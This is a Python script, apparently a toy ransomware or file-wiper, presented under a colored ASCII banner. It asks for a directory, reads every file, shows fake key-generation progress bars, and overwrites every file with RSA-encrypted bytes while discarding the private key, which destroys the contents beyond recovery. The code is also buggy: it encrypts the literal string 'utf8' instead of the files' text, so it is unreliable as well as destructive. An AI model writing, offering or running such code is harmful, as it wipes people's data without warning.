import rsa
import os
import progressbar
import time
import colorama
from colorama import Fore,Back,Style
colorama.init()
print(Fore.RED+"      ▄▄        ▄▄  ▄▄▄▄▄▄▄▄                                ▄▄        ▄▄")
print("      ██        ██   ▀▀▀▀▀███                        ██       █▄        █▄")
print("     ██        ██        ██▀    ▄████▄    ██▄████  ███████     █▄        █▄")
print("    ██        ██       ▄██▀    ██▄▄▄▄██   ██▀        ██         █▄        █▄")
print("   ▄█▀       ▄█▀      ▄██      ██▀▀▀▀▀▀   ██         ██          █▄        █▄")
print("  ▄█▀       ▄█▀      ███▄▄▄▄▄  ▀██▄▄▄▄█   ██         ██▄▄▄        █▄        █▄")
print(" ▄█▀       ▄█▀       ▀▀▀▀▀▀▀▀    ▀▀▀▀▀    ▀▀          ▀▀▀▀         █▄        █▄")
x=0
mas=[]
mas2=[]
text=""
dir=input("Enter path to directory:")
f=os.listdir(dir)
os.chdir(dir)
for sdi in f:
 mas=str(sdi)
 f = open(mas,'r')
 text+=f.read()
 print(Fore.GREEN+"Found file:"+str(sdi))
if text == "":
 print(Fore.RED+"ERROR=All files are empty or don't exists")
 exit()
Fore.RESET
bar = progressbar.ProgressBar(maxval=30, widgets=[Fore.YELLOW+'Generating keys:',progressbar.Bar(left='', marker=Fore.GREEN+'#', right=''),]).start() 
for c in range(0,30): 
 bar.update(c)
 time.sleep(0.2)
bar.finish()
(public,private)=rsa.newkeys(512)
text=str.encode('utf8')
crypto_text=rsa.encrypt(text,public)
print("Keys was generated")
Fore.RESET
print ("Here is crypted text from both files:"+str(crypto_text))
f.close()
f=os.listdir()
Fore.RESET
bar = progressbar.ProgressBar(maxval=30, widgets=[Fore.YELLOW+'Crypting:',progressbar.Bar(left='', marker=Fore.GREEN+'#', right=''),]).start() 
for ds in f:
 mas2=str(ds)
 fc=open(mas2,'wb') 
 fc.write(crypto_text)
 while x <= 30:
  bar.update(x)
  time.sleep(0.07)
  x+=1
bar.finish()
fc.close
print("DONE!")
